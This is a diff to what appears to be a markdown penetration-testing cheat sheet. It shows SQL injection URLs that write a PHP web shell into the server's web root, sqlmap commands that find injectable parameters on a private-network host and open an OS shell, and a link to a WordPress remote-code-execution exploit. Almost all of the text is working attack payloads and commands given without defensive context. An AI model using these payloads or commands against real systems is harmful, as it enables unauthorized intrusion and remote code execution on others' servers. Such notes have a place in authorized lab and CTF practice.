@@ -426,3 +426,22 @@ shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
 http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
 shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
 ```
+
+### Find injectable parameters using SQLMAP
+
+```bash
+sqlmap --url "http://192.168.204.49/class.php" --data="weight=12&height=2323&age=1211&gender=Male&email=ok%40ok.com" 
+```
+
+Once injection point is found, exploit it to dump or get shell
+
+```bash
+
+sqlmap --url "http://192.168.204.49/class.php" --data="weight=12&height=2323&age=1211&gender=Male&email=ok%40ok.com" -p mail-list --os-shell --level=5 --risk=3
+
+```
+
+
+## hacking wordpress panel RCE
+
+follow https://www.exploit-db.com/exploits/36374
